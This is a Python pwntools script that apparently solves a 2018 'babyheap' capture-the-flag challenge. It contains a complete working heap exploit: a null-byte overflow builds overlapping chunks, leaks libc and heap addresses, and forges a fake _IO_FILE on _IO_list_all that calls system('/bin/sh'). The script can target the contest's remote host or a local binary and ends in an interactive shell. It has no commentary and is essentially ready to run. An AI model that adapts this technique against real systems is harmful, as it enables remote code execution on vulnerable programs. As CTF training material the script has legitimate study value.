from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
# context.log_level = 'debug'

def Alloc(p, size, data):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('content: ')
	p.send(data)

def Show(p, index):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(index))

def Delete(p, index):
	p.recvuntil('choice: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(index))

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./babyheap', env = {'LD_PRELOAD': './libc.so.6'})
		#gdb.attach(p)
		# GDBDebugBreakpoint(p, )
	else:
		p = remote(ip, port)
	system_offest = 0x45390
	IO_list_offest = 0x3c5520
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Alloc(p, 0x100 - 0x10, 'swing\n')

	Delete(p, 3)
	Alloc(p, 0x100 - 0x8, '\x00' * 0xf0 + p64(0x400))
	Delete(p, 0)
	Delete(p, 4)
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Alloc(p, 0x100 - 0x10, 'swing\n')
	Delete(p, 4)
	Show(p, 1)
	p.recvuntil('content: ')
	libc_address = u64(p.recvuntil('\n')[0 : -1].ljust(8, '\x00')) - 0x3c4b78
	log.info('libc address is : ' + hex(libc_address))
	Delete(p, 5)
	Alloc(p, 0x100 - 0x10, 'hack by swing\n')
	Alloc(p, 0x100 - 0x10, 'hack by swing\n')
	Alloc(p, 0x100 - 0x10, 'hack by swing\n')
	Alloc(p, 0x100 - 0x10, 'hack by swing\n')
	Delete(p, 6)
	Delete(p, 4)
	Show(p, 1)
	p.recvuntil('content: ')
	heap_address = u64(p.recvuntil('\n')[0 : -1].ljust(8, '\x00')) - 0x300
	log.info('heap address is : ' + hex(heap_address))
	Delete(p, 7)
	Delete(p, 5)
	Delete(p, 0)

	Alloc(p, 0x100 - 0x10 - 0x20, '\n')
	Alloc(p, 0x100, p64(0) * 2 + p64(0) + p64(0x61) + p64(0) * 10 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21) + '\n')
	Alloc(p, 0x100 - 0x10, p64(0) * 3 + p64(libc_address + system_offest) + '\n')
	Alloc(p, 0x100 - 0x10, '\n')
	Delete(p, 4)
	Delete(p, 1)
	Delete(p, 6)
	Alloc(p, 0x100, p64(0) * 2 + '/bin/sh'.ljust(8, '\x00') + p64(0x61) + p64(0) + p64(libc_address + IO_list_offest - 0x10) + p64(0) + p64(1) + p64(0) * 6 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 6 + p64(0x00000000ffffffff) + p64(0) * 2 + p64(heap_address + 0x200) + '\n')
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('size: ')
	p.sendline(str(0x100))

	p.interactive()

if __name__ == '__main__':
	GameStart('babyheap.2018.teamrois.cn', 3154, 1)
